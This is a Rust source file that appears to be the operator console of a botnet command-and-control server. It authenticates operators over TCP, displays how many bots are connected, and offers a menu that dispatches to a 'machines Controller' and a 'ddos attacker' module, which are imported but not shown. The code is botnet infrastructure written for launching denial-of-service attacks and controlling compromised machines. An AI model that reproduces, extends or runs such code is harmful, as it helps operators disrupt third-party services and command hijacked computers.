
use crate::utils::terminal::{clear, reply_with_delay};
use crate::{ConnectionList, TcpListener, TcpStream, utils::terminal::reply, auth_user, view_menu,Arc, Error };

use super::services::ddos::ddos;
use super::services::machines_controller::machines_controller;

pub async fn client_handle(mut socket: &mut TcpStream, bots_listening: ConnectionList) {


    let welcome_message: &str = r"
                ___          ___ ___    
|__|  /\  \  / |__     |\ | |__   |     
|  | /~~\  \/  |___    | \| |___  |     
                                                    
";
    reply(welcome_message,true,  &mut socket).await;

    let user_is_auth: Result<crate::auth::User, String> = auth_user(&mut socket).await;

    match user_is_auth {
        Ok(data_user) => {

            let message_welcome_to_user = format!("Hello {}, welcome ...", data_user.name);
            
            clear(&mut socket).await;
            reply_with_delay(&message_welcome_to_user, 2,&mut socket).await;
        }
        Err(msg) => {
            let message_reply: &str = &msg; // Converte a String para &str
            reply(message_reply,true,&mut socket).await;
            return;
        }
    };

    loop {

        let listening_bots= bots_listening.read().await;
        let current_quantity_of_bots_connectds = listening_bots.len();
        drop(listening_bots);
        
        let title_menu = format!(r"
                ___          ___ ___    
|__|  /\  \  / |__     |\ | |__   |     
|  | /~~\  \/  |___    | \| |___  |     
                                         
{current_quantity_of_bots_connectds} bots connectds");
        let main_menu_itens: [&str; 2] = ["machines Controller", "ddos attacker"];  

        let option_selected: Result<u32, String> =  view_menu(&title_menu.as_str(), &main_menu_itens, &mut socket).await ;

        match option_selected {
            Ok(0) => {
                reply("Exiting c2 ...", true, &mut socket).await;
                reply("Closing connection ...", true, &mut socket).await;
                break
            },
            Ok(1) => {
                match machines_controller(&mut socket, Arc::clone(&bots_listening)).await {
                    Ok(_) => {},
                    Err(e) => {
                        println!("{e}");
                    }
                };
                continue;
            },
            Ok(2) => {
                let listening_bots_clone = Arc::clone(&bots_listening);
                ddos(&mut socket, listening_bots_clone).await;
                // match results_ddos {
                //     Ok(_) => println!("deu tudo certo"),
                //     Err(e) => println!("deu erro, error {}",e)
                // }
    
            },
            Ok(_res) => {
                reply_with_delay("Invalid option !", 2, &mut socket).await;
                continue;
            },
            Err(error_response) => {
                reply(&error_response.as_str(), true, &mut socket).await;
            } 
        }

    }

    

       

    

}

pub async fn c2_services_users(host:&str, port:u32, connections: ConnectionList) -> Result<(), Box<dyn Error> > {
    let host_and_port_clients = format!("{}:{}", host,port);
    let listen: TcpListener = TcpListener::bind(host_and_port_clients.as_str()).await?;

    println!("Server listening connection from users in {host_and_port_clients}");

    loop {
        let (mut socket, _) = listen.accept().await?;
        println!("Connection received from user ...");
        
        let bots_listening = Arc::clone(&connections);

        tokio::spawn(async move {
            client_handle(&mut socket,bots_listening ).await;
        });
    }
}
